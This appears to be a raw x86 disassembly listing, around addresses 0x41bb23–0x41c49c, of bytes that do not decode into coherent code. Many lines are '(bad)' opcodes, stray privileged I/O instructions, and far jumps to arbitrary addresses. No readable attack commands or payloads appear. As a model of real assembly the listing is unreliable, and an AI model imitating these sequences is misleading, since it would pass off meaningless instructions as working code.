  41bb23:	push   cs
  41bb24:	fisubr DWORD PTR [edi]
  41bb26:	xor    ah,BYTE PTR [ecx+eax*1]
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [eax],bl
  41bb2f:	push   ds
  41bb30:	fs ja  0x41bb4e
  41bb33:	xor    ch,BYTE PTR [ebx-0x4d]
  41bb36:	pop    ebx
  41bb37:	inc    edx
  41bb38:	add    esp,ebp
  41bb3a:	pop    ebx
  41bb3b:	xor    DWORD PTR [edx+ecx*1],ebp
  41bb3e:	scas   al,BYTE PTR es:[edi]
  41bb3f:	sub    DWORD PTR [edx+0x24],edi
  41bb42:	sub    al,0xdf
  41bb44:	push   0xb2ad3c3d
  41bb49:	pop    ebp
  41bb4a:	cmp    al,bl
  41bb4c:	mov    eax,ds:0xf037a304
  41bb51:	jo     0x41bb93
  41bb53:	jb     0x41bad6
  41bb55:	pop    ebp
  41bb56:	add    DWORD PTR ds:[edi+ecx*8-0x15f2d434],ecx
  41bb5e:	add    eax,0x8733d8ba
  41bb63:	retf   
  41bb64:	fcmovnb st,st(6)
  41bb66:	pop    esp
  41bb67:	xchg   BYTE PTR [esi+0x45832dfd],bh
  41bb6d:	test   BYTE PTR [ebx+0x17f9dcf],ah
  41bb73:	cmc    
  41bb74:	repz aas 
  41bb76:	test   dh,0x43
  41bb79:	xor    DWORD PTR [esi],ecx
  41bb7b:	and    eax,0x48912789
  41bb80:	mov    ebx,0xd25b46bc
  41bb85:	and    al,0xcb
  41bb87:	cdq    
  41bb88:	cwde   
  41bb89:	shl    cl,1
  41bb8b:	mov    bh,BYTE PTR [edx+0x33c07b86]
  41bb91:	es jnp 0x41bbfa
  41bb94:	mov    dl,0x81
  41bb96:	xor    al,0x39
  41bb98:	in     al,dx
  41bb99:	(bad)  
  41bb9a:	ror    BYTE PTR [esi-0x3f],0x8c
  41bb9e:	js     0x41bbbc
  41bba0:	add    esp,DWORD PTR [eax]
  41bba2:	jb     0x41bb56
  41bba4:	sti    
  41bba5:	rol    DWORD PTR [eax],1
  41bba7:	out    0x1f,eax
  41bba9:	stos   BYTE PTR es:[edi],al
  41bbaa:	mov    eax,0xb9a8070f
  41bbaf:	es mul DWORD PTR es:[ecx]
  41bbb3:	in     al,dx
  41bbb4:	jmp    0x41bbd2
  41bbb6:	pop    esp
  41bbb7:	mov    esp,0xfbacf7e7
  41bbbc:	dec    dl
  41bbbe:	sub    DWORD PTR [ecx+0x31],esi
  41bbc1:	ins    BYTE PTR es:[edi],dx
  41bbc2:	in     eax,dx
  41bbc3:	icebp  
  41bbc4:	sub    BYTE PTR [ecx+0x1b],bl
  41bbc7:	(bad)  
  41bbc8:	ins    DWORD PTR es:[edi],dx
  41bbc9:	mov    ah,0x8c
  41bbcb:	sti    
  41bbcc:	jle    0x41bb58
  41bbce:	adc    al,0xb4
  41bbd0:	cld    
  41bbd1:	sub    DWORD PTR [ebp-0x2aeea13f],0x14
  41bbd8:	xchg   esp,eax
  41bbd9:	pop    ecx
  41bbda:	jo     0x41bc50
  41bbdc:	pop    es
  41bbdd:	sub    al,0xf5
  41bbdf:	cmp    esi,ecx
  41bbe1:	(bad)  
  41bbe2:	jmp    0xca05c9a1
  41bbe7:	jno    0x41bb71
  41bbe9:	adc    al,0x11
  41bbeb:	push   ecx
  41bbec:	popf   
  41bbed:	and    ecx,DWORD PTR [esi+0x7e1d46dd]
  41bbf3:	sub    al,0x16
  41bbf5:	xchg   esp,eax
  41bbf6:	xchg   ebx,eax
  41bbf7:	mov    BYTE PTR [ebx+ebp*2+0x52],0x7e
  41bbfc:	adc    eax,0x15597fff
  41bc01:	ins    BYTE PTR es:[edi],dx
  41bc02:	inc    edx
  41bc03:	es xchg esi,eax
  41bc05:	pop    ebp
  41bc06:	clc    
  41bc07:	ins    BYTE PTR es:[edi],dx
  41bc08:	in     eax,dx
  41bc09:	inc    ebp
  41bc0a:	cmc    
  41bc0b:	add    esi,edi
  41bc0d:	sbb    BYTE PTR [ebx+0x21cdabc],cl
  41bc13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc14:	xor    esp,DWORD PTR [ecx+0x16eb57f9]
  41bc1a:	push   ss
  41bc1b:	pushf  
  41bc1c:	stos   BYTE PTR es:[edi],al
  41bc1d:	cmp    al,0x23
  41bc1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc20:	jnp    0x41bc2c
  41bc22:	and    eax,0x3e95f594
  41bc27:	xor    BYTE PTR [ecx+eax*2+0x14],cl
  41bc2b:	push   0xffffffae
  41bc2d:	neg    DWORD PTR [esi]
  41bc2f:	loop   0x41bc9d
  41bc31:	cmp    ah,al
  41bc33:	(bad)
	...
  41bc96:	shl    BYTE PTR [edx],cl
  41bc98:	cli    
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x3a06248d
  41bca4:	lds    ebx,FWORD PTR [ecx+0x39]
  41bca7:	and    eax,0x1070001
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	pop    esp
  41bcaf:	in     al,dx
  41bcb0:	pusha  
  41bcb1:	jmp    0xe2721ee1
  41bcb6:	push   cs
  41bcb7:	fiadd  DWORD PTR [ebx-0x6e]
  41bcba:	inc    esp
  41bcbb:	add    DWORD PTR ds:0xa79fa9d4,0x61
  41bcc2:	pop    eax
  41bcc3:	sub    BYTE PTR [ecx-0x5ef5cef5],dh
  41bcc9:	aam    0xe7
  41bccb:	sub    DWORD PTR [edi+eax*4-0x3a7bda62],0x2
  41bcd3:	or     eax,0x5c88c44c
  41bcd8:	mov    bl,0x87
  41bcda:	stos   DWORD PTR es:[edi],eax
  41bcdb:	(bad)  
  41bcdc:	jle    0x41bd33
  41bcde:	mov    dh,BYTE PTR [eax+0x118062d9]
  41bce4:	ds leave 
  41bce6:	mov    eax,0x6236ca0c
  41bceb:	ds mov dl,0xa6
  41bcee:	loope  0x41bd5f
  41bcf0:	in     eax,dx
  41bcf1:	xchg   ebx,eax
  41bcf2:	push   ds
  41bcf3:	mov    al,0xd
  41bcf5:	xchg   esp,eax
  41bcf6:	dec    ebp
  41bcf7:	mov    WORD PTR ds:0x2468ba9c,cs
  41bcfd:	ja     0x41bcad
  41bcff:	ficomp WORD PTR [eax-0x5fd443a8]
  41bd05:	movhps QWORD PTR [esp+edx*4-0x44],xmm6
  41bd0a:	into   
  41bd0b:	ins    DWORD PTR es:[edi],dx
  41bd0c:	ins    BYTE PTR es:[edi],dx
  41bd0d:	pushf  
  41bd0e:	repnz sub bl,BYTE PTR [edx+0x48a61ccb]
  41bd15:	inc    esi
  41bd16:	cmp    BYTE PTR [ecx],ch
  41bd18:	sti    
  41bd19:	aas    
  41bd1a:	push   esp
  41bd1b:	mov    bh,0x6b
  41bd1d:	add    DWORD PTR [edi],ebx
  41bd1f:	xor    BYTE PTR [edi],ch
  41bd21:	xor    ebx,ebp
  41bd23:	iret   
  41bd24:	in     eax,0xb9
  41bd26:	add    ah,cl
  41bd28:	sbb    al,0x7b
  41bd2a:	push   ecx
  41bd2b:	lock scas eax,DWORD PTR es:[edi]
  41bd2d:	pop    eax
  41bd2e:	pop    edx
  41bd2f:	scas   eax,DWORD PTR es:[edi]
  41bd30:	lods   al,BYTE PTR ds:[esi]
  41bd31:	cwde   
  41bd32:	sub    dh,BYTE PTR [esp+eax*4]
  41bd35:	out    0x70,eax
  41bd37:	add    DWORD PTR [ecx-0x29],0x94fdec23
  41bd3e:	xchg   esi,eax
  41bd3f:	or     al,0x8d
  41bd41:	jae    0x41bdae
  41bd43:	repz push es
  41bd45:	xchg   ecx,eax
  41bd46:	cmp    BYTE PTR [esi-0x48],0x3a
  41bd4a:	in     al,0x48
  41bd4c:	lea    ebx,[eax]
  41bd4e:	(bad)  
  41bd4f:	and    edx,DWORD PTR [ebp+esi*8-0x50]
  41bd53:	es inc ebx
  41bd55:	mov    edi,0x1448ad95
  41bd5a:	push   esp
  41bd5b:	jg     0x41bd33
  41bd5d:	add    esp,DWORD PTR [edx+0x3b196a53]
  41bd63:	int3   
  41bd64:	bnd je 0x41bd8b
  41bd67:	sbb    esi,esp
  41bd69:	mov    al,0x7c
  41bd6b:	xchg   ebx,eax
  41bd6c:	data16 cmp al,0x84
  41bd6f:	ja     0x41bd84
  41bd71:	mov    dh,0x64
  41bd73:	fs pop es
  41bd75:	sar    dl,1
  41bd77:	in     al,dx
  41bd78:	inc    edi
  41bd79:	xchg   esi,eax
  41bd7a:	cmp    BYTE PTR [ebp+edi*2+0x17],al
  41bd7e:	push   ss
  41bd7f:	lahf   
  41bd80:	(bad)
  41bd83:	fdiv   QWORD PTR [edi+0x6f]
  41bd86:	repz in eax,dx
  41bd88:	hlt    
  41bd89:	adc    DWORD PTR [esi-0x6741bb15],edx
  41bd8f:	shl    dl,0x3
  41bd92:	int    0x9d
  41bd94:	test   eax,0xcf63e638
  41bd99:	call   0xf561b85b
  41bd9e:	das    
  41bd9f:	push   es
  41bda0:	aad    0x7d
  41bda2:	mov    esi,0x126e4a78
  41bda7:	sub    DWORD PTR [edx+0x26f71d3a],ecx
  41bdad:	push   edx
  41bdae:	or     esi,DWORD PTR [ebp+0x7c1e4eb8]
  41bdb4:	imul   eax,DWORD PTR [eax],0x0
	...
  41be16:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be1c:	imul   edi
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	cmp    dl,dh
  41be24:	jl     0x41bdf9
  41be26:	inc    eax
  41be27:	add    DWORD PTR es:[eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    BYTE PTR [ebx-0x4d],al
  41be30:	sub    BYTE PTR [ecx],dl
  41be32:	jne    0x41bead
  41be34:	in     eax,0x7f
  41be36:	add    eax,0xb2d4a6bd
  41be3b:	pop    ds
  41be3c:	and    esi,DWORD PTR [edx+0x55]
  41be3f:	jo     0x41be54
  41be41:	scas   eax,DWORD PTR es:[edi]
  41be42:	inc    ebx
  41be43:	clc    
  41be44:	ss add dh,bh
  41be47:	pop    ebp
  41be48:	inc    esi
  41be49:	sub    eax,0xc477623d
  41be4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be4f:	cli    
  41be50:	add    BYTE PTR [ebx-0x3880ca06],0x27
  41be57:	lods   al,BYTE PTR ds:[esi]
  41be58:	lea    edi,[ebp-0x49]
  41be5b:	sub    eax,0x3da62b35
  41be60:	in     eax,0x13
  41be62:	popa   
  41be63:	inc    ecx
  41be64:	add    cl,BYTE PTR [eax+0x22]
  41be67:	test   BYTE PTR [edx+ebx*8+0x11],al
  41be6b:	add    al,0x6a
  41be6d:	fisttp DWORD PTR [ebp-0x9]
  41be70:	xchg   ebp,eax
  41be71:	rcl    DWORD PTR [ecx+eiz*1+0x3cc799f9],0x71
  41be79:	adc    DWORD PTR [ebx-0x43],ebp
  41be7c:	xchg   ebp,eax
  41be7d:	mov    cl,0xd3
  41be7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be80:	outs   dx,DWORD PTR ds:[esi]
  41be81:	jmp    0x72010049
  41be86:	add    al,0xf6
  41be88:	ror    BYTE PTR [esi+0x58c2a8e0],1
  41be8e:	adc    BYTE PTR [esp+edx*1],al
  41be91:	fst    st(1)
  41be93:	ja     0x41bec4
  41be95:	inc    eax
  41be96:	cmp    esi,DWORD PTR [ecx-0x30]
  41be99:	imul   ch
  41be9b:	add    al,0x1a
  41be9d:	cmp    BYTE PTR [eax-0x71],al
  41bea0:	or     BYTE PTR [esi-0x2c3fb3d0],cl
  41bea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bea7:	mov    ds:0xfa78e54c,eax
  41beac:	loope  0x41becc
  41beae:	push   ecx
  41beaf:	test   al,0x4
  41beb1:	out    0x58,al
  41beb3:	dec    eax
  41beb4:	inc    ebx
  41beb5:	or     eax,0x335c6541
  41beba:	mov    ebp,0x6ebde04a
  41bebf:	pop    DWORD PTR [ebp+0x63]
  41bec2:	pop    ebp
  41bec3:	jmp    0x7fc7:0x80e5afb8
  41beca:	inc    edi
  41becb:	stos   DWORD PTR es:[edi],eax
  41becc:	aad    0x2
  41bece:	cs (bad) 
  41bed0:	sbb    eax,0x3af74bf2
  41bed5:	imul   ebx,DWORD PTR [eax+0x77],0x47980efb
  41bedc:	shl    DWORD PTR [edi+0x3],1
  41bedf:	adc    al,0x9
  41bee1:	enter  0xc2a7,0x54
  41bee5:	and    eax,0xb5733fa3
  41beea:	adc    DWORD PTR [ebx+0x1e4986b7],eax
  41bef0:	cmp    eax,DWORD PTR [esi+0x59034801]
  41bef6:	add    al,0x17
  41bef8:	mov    esi,0xf127045
  41befd:	in     al,0xeb
  41beff:	inc    esp
  41bf00:	aas    
  41bf01:	mov    DWORD PTR [ebx+0x3b],edx
  41bf04:	push   eax
  41bf05:	pop    edx
  41bf06:	inc    eax
  41bf07:	mov    esp,0x87dea10d
  41bf0c:	sub    dl,BYTE PTR [edi+0x33ed1f83]
  41bf12:	inc    ecx
  41bf13:	retf   
  41bf14:	mov    ds:0x3f3cc400,eax
  41bf19:	nop
  41bf1a:	leave  
  41bf1b:	clc    
  41bf1c:	jae    0x41be9f
  41bf1e:	cs xchg esi,eax
  41bf20:	js     0x41bf71
  41bf22:	ret    0x33ee
  41bf25:	sahf   
  41bf26:	and    ecx,DWORD PTR cs:[eax]
  41bf29:	addr16 add al,0xd1
  41bf2c:	cld    
  41bf2d:	or     edi,DWORD PTR [ebx-0x1c8fc898]
  41bf33:	inc    ecx
  41bf34:	add    BYTE PTR es:[eax],al
	...
  41bf93:	add    BYTE PTR [eax],al
  41bf95:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	fadd   QWORD PTR [ebx]
  41bfa4:	pop    esi
  41bfa5:	mov    esi,0x12747
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    dh,dl
  41bfaf:	push   ecx
  41bfb0:	xchg   ebx,eax
  41bfb1:	sar    DWORD PTR [ebx+0x1f44a562],cl
  41bfb7:	call   0xf5f:0x3c73277f
  41bfbe:	pop    eax
  41bfbf:	(bad)  
  41bfc1:	or     eax,0x4218d0d8
  41bfc6:	out    dx,eax
  41bfc7:	imul   ebx,DWORD PTR [ebp-0x4d622476],0xdfff02e1
  41bfd1:	or     dl,BYTE PTR cs:[esi-0x13]
  41bfd5:	push   edi
  41bfd6:	pop    ebp
  41bfd7:	mov    BYTE PTR [ebp+0x43],bl
  41bfda:	xchg   edi,eax
  41bfdb:	adc    BYTE PTR [edx],bl
  41bfdd:	jnp    0x41bfea
  41bfdf:	in     eax,dx
  41bfe0:	add    eax,0x44951d13
  41bfe6:	sti    
  41bfe7:	jbe    0x41bf91
  41bfe9:	push   edi
  41bfea:	mov    WORD PTR [ebp*4-0x14eb21f5],es
  41bff1:	neg    DWORD PTR [eax]
  41bff3:	pop    ecx
  41bff4:	jns    0x41bf9d
  41bff6:	les    ebx,FWORD PTR [edi+edi*1]
  41bff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bffa:	push   ss
  41bffb:	or     eax,esp
  41bffd:	push   ds
  41bffe:	xor    ecx,DWORD PTR [edx-0x5c]
  41c001:	test   BYTE PTR [edx],bh
  41c003:	int3   
  41c004:	sti    
  41c005:	pop    esp
  41c006:	lea    edx,[edx+0x6e]
  41c009:	pushf  
  41c00a:	cmp    ecx,esi
  41c00c:	nop
  41c00d:	add    al,0xf4
  41c00f:	call   0x4e27:0xf559a093
  41c016:	loop   0x41c093
  41c018:	pop    ebx
  41c019:	jae    0x41bfc0
  41c01b:	cmp    al,0xd3
  41c01d:	das    
  41c01e:	add    DWORD PTR [edi+0x7682a1c1],esi
  41c024:	cmp    eax,0xccb30afc
  41c029:	rcr    DWORD PTR [eax+0x3e4d04a0],1
  41c02f:	into   
  41c030:	pop    edx
  41c031:	push   0xba638554
  41c036:	pop    edx
  41c037:	pop    ebp
  41c038:	xor    DWORD PTR [esi],0xd
  41c03b:	mov    ds:0x227e3c5f,al
  41c040:	pop    es
  41c041:	sbb    DWORD PTR [edx-0x75],edx
  41c044:	rol    BYTE PTR ds:0xee34bcf4,1
  41c04a:	mov    al,ds:0x8f29f1b1
  41c04f:	(bad)  
  41c051:	pop    ds
  41c052:	cmp    al,0xe8
  41c054:	popa   
  41c055:	push   esp
  41c056:	xchg   DWORD PTR [edx+0x300f9f8c],ebx
  41c05c:	aam    0x55
  41c05e:	fucomip st,st(5)
  41c060:	int3   
  41c061:	das    
  41c062:	or     dh,BYTE PTR [ecx-0x74d6a578]
  41c068:	mov    WORD PTR [ecx-0x7b3ba1cc],cs
  41c06e:	sbb    BYTE PTR [ecx+eiz*1+0x1e],0x5d
  41c073:	xor    BYTE PTR [edx-0x2b],dl
  41c076:	mov    BYTE PTR [ecx+ebx*2],cl
  41c079:	adc    al,0x1e
  41c07b:	mov    cl,0x69
  41c07d:	test   DWORD PTR [edi-0x61],edi
  41c080:	sti    
  41c081:	mov    edi,edx
  41c083:	aas    
  41c084:	dec    esi
  41c085:	in     al,dx
  41c086:	mov    ebx,0xa5694aae
  41c08b:	int3   
  41c08c:	in     al,dx
  41c08d:	or     eax,0xff245da6
  41c092:	daa    
  41c093:	call   0xb4d607c
  41c098:	xchg   esi,eax
  41c099:	adc    DWORD PTR [eax-0x7461a6a4],esi
  41c09f:	aas    
  41c0a0:	push   esp
  41c0a1:	push   0x4a0cca2e
  41c0a6:	sbb    ebx,DWORD PTR [ebp-0x4d05e30f]
  41c0ac:	fcomp  DWORD PTR [edi+0x726a5c18]
  41c0b2:	popa   
  41c0b3:	mov    ch,0x61
	...
  41c115:	add    cl,bl
  41c117:	dec    edx
  41c118:	mov    eax,ds:0xd9fbb3f8
  41c11d:	imul   ecx,DWORD PTR [ecx-0x29],0xffffffbd
  41c121:	clc    
  41c122:	add    DWORD PTR ds:0x284ee659,edx
  41c128:	add    DWORD PTR [eax],eax
  41c12a:	pop    es
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [ecx+0x3e6559b],al
  41c133:	push   ebp
  41c134:	xlat   BYTE PTR ds:[ebx]
  41c135:	jnp    0x41c11e
  41c137:	fxch   st(2)
  41c139:	shr    DWORD PTR fs:[eax],1
  41c13c:	loop   0x41c14f
  41c13e:	(bad)  
  41c13f:	jmp    0x41c17c
  41c141:	icebp  
  41c142:	lods   al,BYTE PTR ds:[esi]
  41c143:	push   ebx
  41c144:	ins    DWORD PTR es:[edi],dx
  41c145:	cli    
  41c146:	sar    BYTE PTR [eax-0x14546c22],0x22
  41c14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c14e:	addr16 push edx
  41c150:	fwait
  41c151:	push   ds
  41c152:	and    al,0xca
  41c154:	mov    eax,0xffd5ae85
  41c159:	xchg   BYTE PTR [edi-0x45],dh
  41c15c:	lds    ecx,FWORD PTR [ecx+0x20]
  41c15f:	mov    al,0x54
  41c161:	call   0x9cbfcf9c
  41c166:	lea    edx,[edi-0x19]
  41c169:	cdq    
  41c16a:	push   cs
  41c16b:	mov    ebp,0x354d22c
  41c170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c171:	jge    0x41c116
  41c173:	dec    esp
  41c174:	push   ecx
  41c175:	cmove  ebp,DWORD PTR [edx+0x12933]
  41c17c:	lahf   
  41c17d:	ins    BYTE PTR es:[edi],dx
  41c17e:	pop    ecx
  41c17f:	lods   al,BYTE PTR ds:[esi]
  41c180:	xor    al,0xd5
  41c182:	mov    DWORD PTR [edx+0x6a],eax
  41c185:	and    eax,0xfb00b118
  41c18a:	pushf  
  41c18b:	out    0x6c,al
  41c18d:	rol    ebp,1
  41c18f:	adc    ebx,DWORD PTR [ebp+0x67f27096]
  41c195:	sub    ch,BYTE PTR [esi-0x76]
  41c198:	ss pop ds
  41c19a:	xchg   ah,cl
  41c19c:	adc    eax,0x70dd289
  41c1a1:	ficomp WORD PTR [ecx-0x1ed723df]
  41c1a7:	jecxz  0x41c1cd
  41c1a9:	jmp    0x7137:0x619a8cbc
  41c1b0:	inc    dl
  41c1b2:	sub    dh,cl
  41c1b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1b5:	sub    BYTE PTR [ecx],al
  41c1b7:	mov    WORD PTR [esi+edx*4+0x4c8a0524],ds
  41c1be:	hlt    
  41c1bf:	cli    
  41c1c0:	mov    esp,0xc8530be5
  41c1c5:	mov    ebx,0x96b562b
  41c1ca:	fimul  DWORD PTR [esi+0xd]
  41c1cd:	(bad)  [esi+ebx*2+0x56179b17]
  41c1d4:	mov    edx,fs
  41c1d6:	daa    
  41c1d7:	(bad)  
  41c1d8:	mov    dl,0x65
  41c1da:	add    BYTE PTR [eax],0xdf
  41c1dd:	xor    edi,DWORD PTR [esi+ebp*2]
  41c1e0:	(bad)  
  41c1e1:	xchg   edx,eax
  41c1e2:	hlt    
  41c1e3:	jecxz  0x41c1be
  41c1e5:	iret   
  41c1e6:	aad    0xaa
  41c1e8:	jmp    0x41c253
  41c1ea:	rcr    BYTE PTR [ebx-0x39ce8dd6],cl
  41c1f0:	sbb    al,0xce
  41c1f2:	sbb    edx,ecx
  41c1f4:	call   0x9276:0x19621bc3
  41c1fb:	aaa    
  41c1fc:	pusha  
  41c1fd:	sti    
  41c1fe:	sbb    esi,ecx
  41c200:	fisub  DWORD PTR [edx-0x6b721bc]
  41c206:	jo     0x41c210
  41c208:	or     dl,cl
  41c20a:	sbb    al,0xf7
  41c20c:	mov    cl,0xfb
  41c20e:	mov    dh,0x82
  41c210:	mov    ebp,0x7d597060
  41c215:	push   eax
  41c216:	lds    ecx,FWORD PTR [ecx+0x30]
  41c219:	jmp    0x5f0d:0x2ac335dd
  41c220:	mov    DWORD PTR [eax-0x39],edx
  41c223:	and    eax,0x40f14ea5
  41c228:	xchg   BYTE PTR [edi-0x4c82102c],dl
  41c22e:	adc    esi,edx
  41c230:	popa   
  41c231:	popf   
  41c232:	or     bh,BYTE PTR [ecx]
  41c234:	imul   eax,DWORD PTR [eax],0x0
	...
  41c293:	add    BYTE PTR [eax],al
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	xchg   ebx,eax
  41c2a3:	mov    cl,0xbc
  41c2a5:	mov    al,ds:0x12955
  41c2aa:	pop    es
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [edi+0x4e],ch
  41c2b0:	jno    0x41c2d7
  41c2b2:	(bad)  
  41c2b3:	in     al,dx
  41c2b4:	out    0xe8,eax
  41c2b6:	loop   0x41c30a
  41c2b8:	mov    al,ds:0xc8dff955
  41c2bd:	popa   
  41c2be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2bf:	push   0xec3fd27a
  41c2c4:	div    dl
  41c2c6:	sti    
  41c2c7:	mov    DWORD PTR [eax-0x56],ebx
  41c2ca:	shl    DWORD PTR [esi],1
  41c2cc:	mov    bh,ch
  41c2ce:	jne    0x41c25f
  41c2d0:	push   0xffffffb5
  41c2d2:	adc    eax,DWORD PTR [esi+0xbcd4e07]
  41c2d8:	retf   
  41c2d9:	imul   eax
  41c2db:	push   esp
  41c2dc:	mov    esi,0x432fd601
  41c2e1:	(bad)  
  41c2e3:	or     al,0x40
  41c2e5:	dec    ecx
  41c2e6:	gs mov ebx,?
  41c2e9:	and    ebx,DWORD PTR [ebx+0x3b]
  41c2ec:	push   esi
  41c2ed:	push   ebp
  41c2ee:	xchg   edx,eax
  41c2ef:	(bad)  
  41c2f1:	xor    dl,BYTE PTR [edx]
  41c2f3:	(bad)  
  41c2f4:	jmp    0xee5e7319
  41c2f9:	add    dh,ch
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	in     eax,dx
  41c2fd:	sbb    eax,edx
  41c2ff:	add    DWORD PTR [esi],ebp
  41c301:	test   al,0xeb
  41c303:	aaa    
  41c304:	mov    dl,0xd9
  41c306:	repnz stos BYTE PTR es:[edi],al
  41c308:	mov    edi,0x3de73e2f
  41c30d:	(bad)  
  41c30e:	xchg   edx,eax
  41c30f:	loop   0x41c37c
  41c311:	shl    BYTE PTR [ebx],cl
  41c313:	ja     0x41c372
  41c315:	push   es
  41c316:	push   edx
  41c317:	dec    edi
  41c318:	jmp    0x893e:0xf687568d
  41c31f:	add    al,0x89
  41c321:	loop   0x41c2ed
  41c323:	add    al,0x77
  41c325:	jmp    0x38bda408
  41c32a:	adc    bh,dl
  41c32c:	mov    edx,?
  41c32e:	cmp    edi,esp
  41c330:	inc    ebx
  41c331:	scas   al,BYTE PTR es:[edi]
  41c332:	cmc    
  41c333:	lahf   
  41c334:	repnz clc 
  41c336:	dec    esp
  41c337:	ins    DWORD PTR es:[edi],dx
  41c338:	sahf   
  41c339:	scas   al,BYTE PTR es:[edi]
  41c33a:	mov    BYTE PTR [edi+0x7452b25e],dh
  41c340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c341:	mov    ?,esi
  41c343:	stos   BYTE PTR es:[edi],al
  41c344:	push   ss
  41c345:	sahf   
  41c346:	rol    BYTE PTR [eax+0x6f],cl
  41c349:	adc    ebx,DWORD PTR [eax-0x4a]
  41c34c:	mov    ebp,0x1261484d
  41c351:	mov    bh,0x36
  41c353:	dec    ebp
  41c354:	xchg   DWORD PTR [ebx+0x25],ebp
  41c357:	push   es
  41c358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c359:	mov    BYTE PTR [edi],bl
  41c35b:	ss loop 0x41c390
  41c35e:	inc    esi
  41c35f:	icebp  
  41c360:	and    bh,ch
  41c362:	cmp    al,0x3b
  41c364:	sub    DWORD PTR [ebx],0xffffffea
  41c367:	jge    0x41c3d2
  41c369:	sub    DWORD PTR [ebp+0x63],edi
  41c36c:	sbb    eax,DWORD PTR [edx-0x2e]
  41c36f:	and    DWORD PTR [edx+0x54],0xffffffc2
  41c373:	(bad)  
  41c374:	adc    cl,BYTE PTR [edx+edx*2-0x286c285f]
  41c37b:	enter  0xd428,0x45
  41c37f:	mov    DWORD PTR [ebp+0x1d],esp
  41c382:	cmp    esi,DWORD PTR [esi+ebx*2]
  41c385:	jae    0x41c3da
  41c387:	jmp    0x5937:0x65d46f26
  41c38e:	into   
  41c38f:	xchg   esp,eax
  41c390:	dec    esp
  41c391:	dec    esi
  41c392:	xor    BYTE PTR [edx+0x4e],dl
  41c395:	mov    ds:0x60df36a7,eax
  41c39a:	or     bh,0x40
  41c39d:	mov    ah,0xdf
  41c39f:	or     dh,dh
  41c3a1:	ja     0x41c3dd
  41c3a3:	inc    ecx
  41c3a4:	imul   esi,esi,0x3c
  41c3a7:	xchg   BYTE PTR [ecx],al
  41c3a9:	leave  
  41c3aa:	xchg   DWORD PTR [edx],ebx
  41c3ac:	fwait
  41c3ad:	jbe    0x41c35b
  41c3af:	push   cs
  41c3b0:	addr16 das 
  41c3b2:	repz pop ecx
  41c3b4:	push   eax
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [esi+eax*2+0x42]
  41c424:	mov    eax,0x12a5c4c
  41c429:	add    BYTE PTR [edi],al
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [edx+ebx*4-0x49],ch
  41c431:	test   al,0xd4
  41c433:	sbb    DWORD PTR [ebp+ecx*2+0x441bb7f8],edi
  41c43a:	or     BYTE PTR [esi-0x68],0x2
  41c43e:	test   al,0x48
  41c440:	jo     0x41c439
  41c442:	call   0x2f410e03
  41c447:	mov    edi,0xeac8c8a2
  41c44c:	out    0x30,al
  41c44e:	aad    0x47
  41c450:	or     DWORD PTR [ebp-0x1e],edi
  41c453:	hlt    
  41c454:	test   dh,bl
  41c456:	fwait
  41c457:	ja     0x41c464
  41c459:	inc    edx
  41c45a:	or     eax,0xcdd5cd75
  41c45f:	ret    
  41c460:	xor    bl,dl
  41c462:	inc    BYTE PTR [eax]
  41c464:	shl    DWORD PTR [ebx-0x77],0x9e
  41c468:	and    al,0x15
  41c46a:	mov    DWORD PTR [ecx],esi
  41c46c:	sub    ebx,0xac97110e
  41c472:	inc    esp
  41c473:	scas   eax,DWORD PTR es:[edi]
  41c474:	add    esi,DWORD PTR [edx+0x42]
  41c477:	push   esp
  41c478:	lods   al,BYTE PTR ds:[esi]
  41c479:	inc    esi
  41c47a:	jnp    0x41c42a
  41c47c:	dec    ebp
  41c47d:	jae    0x41c409
  41c47f:	ret    
  41c480:	outs   dx,BYTE PTR ds:[esi]
  41c481:	xchg   ecx,eax
  41c482:	xchg   dh,al
  41c484:	mov    esp,0x33ec01ea
  41c489:	jo     0x41c4b9
  41c48b:	xor    BYTE PTR [edx],dl
  41c48d:	xchg   esp,eax
  41c48e:	data16 in al,0x17
  41c491:	sub    edi,ebp
  41c493:	in     al,dx
  41c494:	stos   BYTE PTR es:[edi],al
  41c495:	fcom   QWORD PTR [esi-0x462550fd]
  41c49b:	push   edi
  41c49c:	add    BYTE PTR ds:0xb0b47c97,dh
